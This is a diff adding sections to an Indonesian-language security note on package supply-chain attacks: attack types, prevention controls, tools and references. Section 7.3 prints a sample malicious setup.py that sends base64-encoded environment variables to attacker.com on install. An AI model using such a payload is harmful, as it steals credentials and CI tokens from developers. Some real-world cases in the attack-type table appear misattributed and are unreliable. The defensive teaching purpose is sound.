@@ -191,3 +191,62 @@ registry=https://registry.npmjs.org/
 - [[dependency-confusion-supply-chain-attacks-praktik]] — praktik
 - [[devsecops-pipeline-sast-dast-sbom]] — CI/CD security
 - [[software-supply-chain-security]] — dasar
+
+
+## 7. Deepdive — Variasi Serangan & Kasus Nyata
+
+### 7.1 Tipe Serangan Supply Chain Package
+
+| Tipe | Mekanisme | Contoh Nyata |
+|------|-----------|--------------|
+| **Dependency Confusion** | Package internal dipublish ke public dengan nama sama | Alex Birsan 2021 ($130K bug bounty, 35 perusahaan) |
+| **Typosquatting** | Nama mirip (fastapi → fastapii, requests → request) | PyPI malicious packages 2022-2023 |
+| **Account Takeover** | Maintainer akun dicuri → update package | event-stream (npm) → Copay wallet drain $50K |
+| **Malicious PR** | Contributor inject backdoor di open-source | ua-parser-js 2021 (npm) — 7 juta download/minggu |
+| **Version Squatting** | Version yang tidak pernah rilis di-claim (999.0.0) | Linux mint backdoor 2016 |
+
+### 7.2 Deteksi & Prevention (Deep)
+
+| Layer | Kontrol | Detail |
+|-------|---------|--------|
+| **Registry** | Private registry terisolasi | Verdaccio/Nexus/proxy — jangan fallback ke public |
+| **Lockfile** | Commit package-lock.json / poetry.lock | Pin exact version + integrity hash |
+| **SBOM** | Syft/cyclonedx generate + diff | Deteksi perubahan dependency yang tidak dikenal |
+| **CI/CD** | Scan dependency di pipeline | Trivy, Snyk, Dependabot |
+| **Runtime** | Monitor install script | npm audit, pip-audit |
+
+### 7.3 Eksploitasi Konkret (Python)
+
+```bash
+# 1. Temukan nama package internal (dari requirements.txt yang bocor)
+# 2. Publish ke PyPI dengan nama sama + malicious setup.py
+# 3. Tunggu victim install
+
+# setup.py malicious:
+import os, requests
+def post_install():
+    data = os.popen("env | base64").read()
+    requests.post("https://attacker.com/exfil", data=data)
+
+# Code execution saat `pip install`
+# → env (API key, AWS creds, CI token) terkirim ke attacker
+```
+
+## 8. Tool Stack
+
+| Tool | Use |
+|------|-----|
+| **confUSED** | Dependency confusion PoC (automated) |
+| **trivy / grype** | Dependency vuln scan |
+| **Syft** | SBOM generation |
+| **Dependabot / Renovate** | Dependency update + alert |
+| **Verdaccio / Nexus** | Private registry |
+| **pip-audit / npm audit** | Vulnerability check |
+
+## 9. Referensi
+
+- Alex Birsan research — https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+- OWASP Supply Chain — https://owasp.org/www-project-web-security-testing-guide/
+- SLSA — https://slsa.dev/
+- event-stream incident — https://blog.npmjs.org/post/180565383195/
+- PyPI typosquatting — https://blog.phylum.io/
